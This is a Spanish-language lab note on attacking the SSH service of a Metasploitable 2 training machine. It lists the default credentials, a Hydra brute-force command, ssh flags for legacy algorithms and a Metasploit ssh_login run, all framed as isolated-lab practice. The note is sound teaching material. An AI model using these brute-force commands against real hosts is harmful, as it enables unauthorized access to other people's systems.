# SSH — OpenSSH 4.7p1 (puerto 22) — Metasploitable 2

> Práctica de laboratorio: aplicar únicamente sobre tu propia máquina Metasploitable 2 (`192.168.100.9`), aislada de Internet. Documento de la serie [Reconocimiento y Metasploit](./01_reconocimiento_y_metasploit.md).

**Qué es:** SSH (*Secure Shell*) permite administrar la máquina de forma remota y cifrada. Versión **OpenSSH 4.7p1**, **puerto 22**.

**Cómo se explota:** esta versión no tiene un fallo de ejecución remota de código fiable; la vía de entrada es por **credenciales débiles** (fuerza bruta o credenciales conocidas). En Metasploitable funciona `msfadmin / msfadmin`, entre otras.

## Explotación manual (sin Metasploit)

```bash
# Con credenciales conocidas
ssh msfadmin@192.168.100.9        # contraseña: msfadmin

# Fuerza bruta con Hydra (diccionarios de usuarios y contraseñas)
hydra -L usuarios.txt -P passwords.txt -t 4 ssh://192.168.100.9
```

> **Nota sobre algoritmos obsoletos:** el OpenSSH de Metasploitable es tan antiguo que los Kali modernos rechazan su criptografía. Si la conexión falla, añade:
> ```bash
> ssh -oHostKeyAlgorithms=+ssh-rsa -oKexAlgorithms=+diffie-hellman-group1-sha1 -oPubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@192.168.100.9
> ```

## Explotación con Metasploit

```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.100.9
set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt
set STOP_ON_SUCCESS true
run
# al acertar, abre una sesión de shell; conéctate con: sessions -i 1
```

---

> **Ver también:** apunte general de enumeración de [SSH](../../Apuntes%20Generales/03_enumeracion_de_servicios/02_ssh.md) en `Apuntes Generales`.
